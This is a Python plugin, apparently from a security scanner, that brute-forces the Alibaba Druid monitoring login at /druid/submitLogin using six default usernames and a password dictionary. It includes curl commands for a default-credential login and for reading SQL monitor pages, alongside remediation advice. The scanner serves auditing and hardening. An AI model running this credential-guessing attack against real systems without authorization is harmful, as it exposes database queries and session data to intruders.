# Druid 弱口令爆破：6 用户 × password.txt 字典，POST /druid/submitLogin，判定 'success' in t
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from config import settings
from core.http import join_url
from lib.colors import no, ok
from plugins.base import PluginBase


class DruidBrutePlugin(PluginBase):
    name = "Druid 弱口令爆破"
    cve = "N/A"
    severity = "high"
    category = "brute"
    description = "对 /druid/submitLogin 用 6 个默认用户名 + password.txt 字典爆破，命中 success 即成功"
    fix = "修改 Druid 监控默认口令，限制访问来源 IP，关闭未授权的 /druid 路径"
    fix_detail = (
        "【配置修改】application.yml 修改 Druid 监控账号密码：\n"
        "  spring.datasource.druid.stat-view-servlet.login-username: <强口令>\n"
        "  spring.datasource.druid.stat-view-servlet.login-password: <强口令>\n"
        "【IP 白名单】限制访问来源：\n"
        "  spring.datasource.druid.stat-view-servlet.allow: 127.0.0.1,192.168.0.0/16\n"
        "  spring.datasource.druid.stat-view-servlet.deny: 空\n"
        "【禁用监控】生产环境可关闭 Druid 监控：\n"
        "  spring.datasource.druid.stat-view-servlet.enabled: false\n"
        "【WAF 规则】拦截外网对 /druid/* 路径的访问\n"
        "【合规】等保 2.0 8.1.4 要求：身份鉴别信息复杂度"
    )
    reproduce = (
        "# 探测 Druid 监控是否可访问：\n"
        'curl "http://target/druid/" -i\n'
        "  # 返回 302 跳转到 /druid/login.html 即存在 Druid 监控\n"
        "\n"
        "# 尝试默认口令登录（admin/admin、admin/123456 等）：\n"
        'curl -X POST "http://target/druid/submitLogin" \\\n'
        '  -d "loginUsername=admin&loginPassword=admin"\n'
        "\n"
        '# 预期响应（成功）：响应体含 "success" 字样\n'
        "\n"
        "# 登录成功后可查看 SQL 监控、会话信息、连接池状态等敏感信息：\n"
        'curl "http://target/druid/sql.html" -b "JSESSIONID=<已登录的 session>"'
    )
    # D2：Druid 监控未授权全版本存在（取决于配置）
    affected_versions = ""  # Druid 监控页弱口令与若依版本无关，全版本适用
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A07:2021"
    # D7: WAF 绕过支持
    vuln_type = "auth"
    supports_waf_bypass = True

    def verify(self, target, session):
        """用 6 个默认用户名 × password.txt 字典对 /druid/submitLogin 组合爆破

        @param target: 目标主机，用于拼接 Druid 登录接口地址
        @param session: 复用的 HTTP 会话对象
        @return: ScanResult——任一组合命中 success 为 CONFIRMED；有响应但全失败为 SAFE；全网络异常为 UNKNOWN
        """
        # 用户名清单严格保留（6 个）
        user_list = settings.DRUID_USERS
        # 原脚本：self.url + 'druid/submitLogin'（self.url 以 / 结尾，故仅一个斜杠）
        url = join_url(target, "druid/submitLogin")
        # 字典原样读取（splitlines 保留空行口令、'NULL' 字符串等，勿 strip）
        try:
            with open(settings.PASSWORD_DICT, encoding="utf-8") as f:
                password_list = f.read().splitlines()
        except Exception as e:
            print(no(f"Druid 爆破字典读取失败：{e}"))
            return ScanResult(kind="brute", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))

        got_response = False  # 是否至少收到一次响应（避免全网络异常误判 SAFE）
        for user in user_list:
            for password in password_list:
                data = {"loginUsername": user, "loginPassword": password}
                try:
                    login_response = session.post(url, data=data)
                except Exception:
                    # 网络异常：红色提示，继续尝试下一组（不阻断）
                    print(no(f"请求异常,用户名:{user},密码:{password}"))
                    continue
                got_response = True
                # 判定：解析 JSON 严格比对 success == True（布尔），避免 {"success":false} 误报
                # 原始 'success' in text 子串匹配会把失败响应 "success":false 也判为命中（假阳性）
                success_ok = False
                try:
                    j = login_response.json()
                    success_ok = j.get("success") is True
                except Exception:
                    # 非 JSON：Druid 真实响应为纯文本 success(正确)/error(错误)
                    # 也可能返回 JSON {"success":true}，故同时兼容两种形态
                    low = login_response.text.lower().strip()
                    success_ok = (low == "success") or '"success":true' in low or '"success": true' in low
                if success_ok:
                    # 成功=绿色（对齐原脚本成功配色）
                    print(ok(f"登录成功,用户名:{user},密码:{password}"))
                    return ScanResult(
                        kind="brute",
                        name=self.name,
                        severity=self.severity,
                        status=STATUS_CONFIRMED,
                        url=url,
                        evidence=f"命中 success，用户名={user} 密码={password}",
                        extra={"username": user, "password": password},
                        fix=self.fix,
                    )
                else:
                    # 失败=红色（修正原脚本误用绿色，见 agents.md §3.4）
                    print(no(f"登录失败,用户名:{user},密码:{password}"))
        # 全部未命中：若至少收到一次响应，判 SAFE；否则 UNKNOWN
        if got_response:
            return ScanResult(
                kind="brute", name=self.name, status=STATUS_SAFE, url=url, evidence="全部组合未命中 success"
            )
        return ScanResult(
            kind="brute", name=self.name, status=STATUS_UNKNOWN, url=url, evidence="全部请求网络异常，无法判定"
        )
